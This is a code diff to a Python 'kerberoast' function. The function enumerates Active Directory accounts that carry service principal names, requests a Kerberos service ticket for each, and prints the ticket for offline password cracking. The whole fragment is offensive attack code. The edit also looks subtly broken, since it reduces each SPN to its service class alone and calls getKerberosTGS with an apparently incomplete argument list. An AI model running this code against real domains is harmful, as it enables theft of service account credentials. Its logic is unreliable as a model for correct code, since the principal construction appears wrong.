@@ -24,9 +24,15 @@ def kerberoast(username, password, domain, dc_ip):
                     account_name = entry['sAMAccountName'].value
                     spns = entry['servicePrincipalName'].values
                     for spn in spns:
-                        # Kerberoast each account
-                        principal = Principal(spn, type=Principal.NT_PRINCIPAL)
+                        # Extract the service name from the SPN
+                        service_name = spn.split('/')[0]  # Assuming the SPN format is "service/hostname"
+                        
+                        # Create a Principal object for the service
+                        principal = Principal(service_name, type=Principal.NT_SRV_INST)
+                        
+                        # Kerberoast the account
                         tgs_rep = getKerberosTGS(krbtgt_ticket, principal)
+                        
                         print(f"TGS_REP for {account_name} ({spn}):")
                         print(tgs_rep.native)
             else:
